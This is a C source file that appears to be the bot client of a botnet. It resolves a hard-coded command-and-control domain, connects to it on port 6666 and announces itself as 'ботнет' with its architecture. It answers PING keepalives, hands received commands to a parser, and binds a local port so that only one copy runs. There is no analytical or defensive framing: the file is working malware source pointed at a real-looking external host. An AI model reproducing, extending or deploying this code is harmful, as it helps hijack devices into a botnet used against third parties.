#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <arpa/inet.h>

#include "headers/util.h"
#include "headers/parser.h"

#define DOMAIN "boatnet.uk"
#define h_addr h_addr_list[0]


char *get_host(char *domain) {
    struct hostent *host = gethostbyname(domain);
    struct in_addr inetaddr =  *(struct in_addr *)(host->h_addr);
    return inet_ntoa(inetaddr);
}

#define INET_ADDR(o1, o2, o3, o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

void ensure(void)
{
    int fd = socket(AF_INET, SOCK_STREAM, 0);

    if (fd == -1)
    {
#ifdef DEBUG
        printf("[ensure] socket failed\n");
#endif
        return;
    }

    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("[ensure] setsockopt failed\n");
#endif
        close(fd);
        return;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(9902);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
#ifdef DEBUG
        printf("[ensure] dupe detected\n");
#endif
        exit(0);
    }

    if (listen(fd, 1) == -1)
    {
#ifdef DEBUG
        printf("[ensure] listen failed\n");
#endif
        close(fd);
        return;
    }

#ifdef DEBUG
    printf("[ensure] no dupe\n");
#endif
}

void connection(char *arch)
{
    int fd;
    static int confails;

    if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[connection] socket failed\n");
#endif
        return;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);
    addr.sin_addr.s_addr = inet_addr(get_host(DOMAIN)); // 205.185.122.88

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1)
    {
        if (confails++ >= 360)
        {
#ifdef DEBUG
            printf("[connection] failed (%d), exit\n", confails);
#endif
            exit(0);
        }
#ifdef DEBUG
        printf("[connection] failed (%d)\n", confails);
#endif
        close(fd);
        return;
    }

#ifdef DEBUG
    printf("[connection] successful\n");
#endif
    confails = 0;
    char string[util_strlen(arch) + 13], data[64];

    util_strcpy(string, "ботнет ");
    util_strcat(string, arch);

    send(fd, string, util_strlen(string), MSG_NOSIGNAL);

    while (recv(fd, data, sizeof(data) - 1, MSG_NOSIGNAL))
    {
        if (!util_strcmp(data, "PING"))
            send(fd, "PONG", 4, MSG_NOSIGNAL);

        parser(data);
        util_memset(data, 0, sizeof(data));
    }

#ifdef DEBUG
    printf("[connection] lost\n");
#endif
    close(fd);
}
